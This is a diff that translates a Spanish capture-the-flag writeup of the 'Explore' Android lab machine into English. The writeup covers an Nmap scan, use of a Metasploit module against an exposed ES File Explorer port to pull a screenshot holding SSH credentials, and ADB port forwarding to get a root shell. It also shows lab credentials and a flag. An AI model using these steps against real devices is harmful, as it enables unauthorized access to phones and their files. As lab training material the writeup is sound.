@@ -1,6 +1,6 @@
 ﻿# Writeup: Explore
 
->Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:
+>First, we carried out an Nmap scan of the victim machine's TCP ports:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/explore]
@@ -17,7 +17,7 @@ PORT      STATE SERVICE VERSION
 59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
 ```
 
->Al ver abierto un puerto con el servicio de **ES File Explorer mediante http** podemos enumerarlo con el siguiente módulo de **metasploit**, en este caso, vamos a **listar las imágenes** y vemos una que habla de credenciales:
+>When we see a port open with the **ES File Explorer service via HTTP**, we can enumerate it using the following **Metasploit** module; in this case, we’re going to **list the images** and we see one that mentions credentials:
 
 ```bash
 msf auxiliary(scanner/http/es_file_explorer_open_port) > set RHOST 10.129.6.29
@@ -38,7 +38,7 @@ HINT:  Rebuild all objects in this database that use the default collation and r
 [*] Auxiliary module execution completed
 ```
 
->Vamos a descargar esa imagen:
+>Let's download that image:
 
 ```bash
 msf auxiliary(scanner/http/es_file_explorer_open_port) > set ACTION GETFILE 
@@ -52,7 +52,7 @@ msf auxiliary(scanner/http/es_file_explorer_open_port) > run
 ```
 <img width="502" height="425" alt="image" src="https://github.com/user-attachments/assets/0ed685a6-0a89-4827-b3b1-389d7830068b" />
 
->Vemos en la imagen las credenciales `kristi:Kr1sT!5h@Rp3xPl0r3!`, vamos a probarlas para el ssh:
+>In the image, we can see the credentials `kristi:Kr1sT!5h@Rp3xPl0r3!`; let's try them for SSH:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/explore]
@@ -71,14 +71,14 @@ Password authentication
 u0_a76
 ```
 
->Leemos la user flag que está en `/storage/emulated/0`:
+>We read the user flag located at `/storage/emulated/0`:
 
 ```bash
 :/storage/emulated/0 $ cat user.txt
 f32017174c7c7e8f50c6da52891ae250
 ```
 
->Si vemos los servicios runeando vemos en el puerto **5555 TCP** el servicio **Android Debug Bridge** que mediante el binario **adb** podremos ganar acceso privilegiado al sistema:
+>If we look at the running services, we can see the **Android Debug Bridge** service on port **5555 TCP**; by using the **adb** binary, we can gain privileged access to the system:
 
 ```bash
 :/storage/emulated/0 $ ss -ntlp
@@ -91,7 +91,7 @@ LISTEN      0      50        [::ffff:10.129.6.29]:34459                    *:*
 LISTEN      0      50           *:59777                    *:*         
 ```
 
->Nos traemos el puerto mediante **port forwarding**:
+>We set up the port using **port forwarding**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/explore]
@@ -104,7 +104,7 @@ Password authentication
 :/ $
 ```
 
->Usamos el binario de **adb** para conectarnos al dispositivo y ganamos una shell como root, leyendo la flag final:
+>We used the **adb** binary to connect to the device and gained a root shell, reading the final flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
